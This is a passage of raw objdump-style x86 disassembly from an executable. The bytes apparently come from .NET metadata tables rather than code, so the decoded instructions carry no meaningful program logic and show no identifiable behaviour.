  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 a3 02 94 00 10    	add    %ah,0x10009402(%ebx)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 c4                	add    %al,%ah
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 89 19 9a    	add    %dl,-0x65e67700(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 00 0d 9a    	add    %dl,-0x65f30000(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 0d 0f 0a 00 14    	add    %cl,0x14000a0f
  4063c9:	00 78 20             	add    %bh,0x20(%eax)
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	01 15 0e 00 14 00    	add    %edx,0x14000e
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 3f 17 0a    	add    %dl,0xa173f00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 5c 0e 1d    	add    %dl,0x1d0e5c00(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 4b 14 1d    	add    %dl,0x1d144b00(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 e7                	add    %ah,%bh
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 85 05 1d 00 14    	add    %al,0x14001d05(%ebp)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	01 15 0e 00 14 00    	add    %edx,0x14000e
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 ef                	add    %ch,%bh
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 2f                	add    %ch,(%edi)
  406451:	0d c7 00 14 00       	or     $0x1400c7,%eax
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 14 12             	add    %dl,(%edx,%edx,1)
  406460:	53                   	push   %ebx
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 d7 10 1d    	add    %dl,0x1d10d700(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 e7 19 0a    	add    %dl,0xa19e700(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b3 18 c3    	add    %dl,-0x3ce74d00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 83 13 d5    	add    %dl,-0x2aec7d00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 79 12 0a    	add    %dl,0xa127900(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 8d 06 c3    	add    %dl,-0x3cf97300(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 44 1c 1d    	add    %dl,0x1d1c4400(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 39 1c 0a    	add    %dl,0xa1c3900(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 0c    	add    %al,0xc209600(%eax)
  4064dd:	1c e0                	sbb    $0xe0,%al
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 f7    	add    %al,-0x8df6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 e6    	add    %al,-0x19df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 0d 1b f1 00 1a    	and    %cl,0x1a00f11b
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 ba    	add    %al,-0x45df6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 7e 0e             	and    %bh,0xe(%esi)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 c7 0b 1c    	add    %dl,0x1c0bc700(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 69 19 0a    	add    %dl,0xa196900(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 ef                	add    %ch,%bh
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 b8 0a 23    	add    %dl,0x230ab800(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 af 0a 2a 01 24    	add    %ch,0x24012a0a(%edi)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 98 0a 84    	add    %dl,-0x7bf56800(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 ba 1c 1d    	add    %dl,0x1d1cba00(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 0c 03 9a    	add    %dl,-0x65fcf400(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 95 05 38 01 27    	add    %dl,0x27013805(%ebp)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 62 03 0a    	add    %dl,0xa036200(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 9d 14 3e    	add    %dl,0x3e149d00(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 07                	sbb    %al,(%edi)
  4065d9:	15 0a 00 29 00       	adc    $0x29000a,%eax
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	01 15 6b 01 29 00    	add    %edx,0x29016b
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 84 1b 70    	add    %al,0x701b8400(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 84 1b 75    	add    %al,0x751b8400(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	7c 1b                	jl     0x40662d
  406612:	70 01                	jo     0x406615
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 7c 1b 75    	add    %al,0x751b7c00(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e3 0e 7c 01    	addl   $0x17c0ee3,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 07 15 0a    	add    %dl,0xa150718(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 19                	add    %bl,(%ecx)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 19                	add    %bl,(%ecx)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 3e 16 2a    	add    %dl,0x2a163e00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 af 0c 93 01 33    	add    %ch,0x3301930c(%edi)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 89 0c 93    	add    %dl,-0x6cf37700(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 b9 0c 93 01 35    	add    %bh,0x3501930c(%ecx)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 85 16 84 01 36    	add    %al,0x36018416(%ebp)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 bd 05 ab    	add    %dl,-0x54fa4300(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	01 15 0e 00 3b 00    	add    %edx,0x3b000e
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 07                	sbb    %al,(%edi)
  4066f1:	15 0a 00 3b 00       	adc    $0x3b000a,%eax
  4066f6:	17                   	pop    %ss
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 01 15 b1    	add    %al,-0x4eeafee8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 d7                	or     %edx,%edi
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 c3                	add    %eax,%ebx
  40671b:	1b bf 01 3c 00 63    	sbb    0x63003c01(%edi),%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 a6 19 0e 00 3c    	add    %esp,0x3c000e19(%esi)
  40672d:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 01 15 cb    	add    %al,-0x34eafee8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 22 03 d7    	add    %al,-0x28fcde00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 22 03 dc    	add    %al,-0x23fcde00(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 22 03 e2    	add    %al,-0x1dfcde00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 22 03 e8    	add    %al,-0x17fcde00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 d1 0f ee    	add    %al,-0x11f02ef8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	7d 0d                	jge    0x406799
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 8c 07 6b 01    	addl   $0x16b078c,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 c6 12 0e 00    	addl   $0xe12c6,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 1d 03 d7 01    	addl   $0x1d7031d,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 69 0b 0a 02    	addl   $0x20a0b69,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	10 19                	adc    %bl,(%ecx)
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 9b 04 d7    	add    %al,-0x28fb6500(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 ac 04 d7    	add    %al,-0x28fb5400(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 b1 04 d7    	add    %al,-0x28fb4f00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 70 12 0f 02    	addl   $0x20f1270,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 56 1c 0f 02    	addl   $0x20f1c56,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	da 13                	ficoml (%ebx)
  406826:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	cd 13                	int    $0x13
  406850:	23 02                	and    (%edx),%eax
  406852:	49                   	dec    %ecx
  406853:	00 28                	add    %ch,(%eax)
  406855:	4a                   	dec    %edx
  406856:	00 00                	add    %al,(%eax)
  406858:	00 00                	add    %al,(%eax)
  40685a:	86 00                	xchg   %al,(%eax)
  40685c:	fa                   	cli
  40685d:	18 27                	sbb    %ah,(%edi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	aa                   	stos   %al,%es:(%edi)
  40686b:	16                   	push   %ss
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	9f                   	lahf
  406879:	16                   	push   %ss
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 22 03 36    	add    %al,0x36032200(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 22                	add    %ah,(%edx)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 8f 16 42    	add    %al,0x42168f00(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 61 06 42    	add    %al,0x42066100(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	30 19                	xor    %bl,(%ecx)
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 4b 0f 0e    	add    %al,0xe0f4b00(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a3 0c 6b    	add    %al,0x6b0ca300(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 97 0c 47    	add    %al,0x470c9700(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 7b 10 4b    	add    %al,0x4b107b00(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	3a 06                	cmp    (%esi),%al
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	05 19 55 02 54       	add    $0x54025519,%eax
  406917:	00 cc                	add    %cl,%ah
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	75 16                	jne    0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	52                   	push   %edx
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	93                   	xchg   %eax,%ebx
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	31 16                	xor    %edx,(%esi)
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	62 0f                	bound  %ecx,(%edi)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	6f                   	outsl  %ds:(%esi),(%dx)
  406967:	0c 47                	or     $0x47,%al
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	7c 0c                	jl     0x406982
  406976:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	b1 13                	mov    $0x13,%cl
  406984:	23 02                	and    (%edx),%eax
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	bf 13 15 02 5a       	mov    $0x5a021513,%edi
  406995:	00 56 25             	add    %dl,0x25(%esi)
  406998:	00 00                	add    %al,(%eax)
  40699a:	00 00                	add    %al,(%eax)
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	e2 18                	loop   0x4069b8
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	ee                   	out    %al,(%dx)
  4069ad:	18 55 02             	sbb    %dl,0x2(%ebp)
  4069b0:	5b                   	pop    %ebx
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	86 1c 5a             	xchg   %bl,(%edx,%ebx,2)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	f4                   	hlt
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	ca 14 64             	lret   $0x6414
  4069d9:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
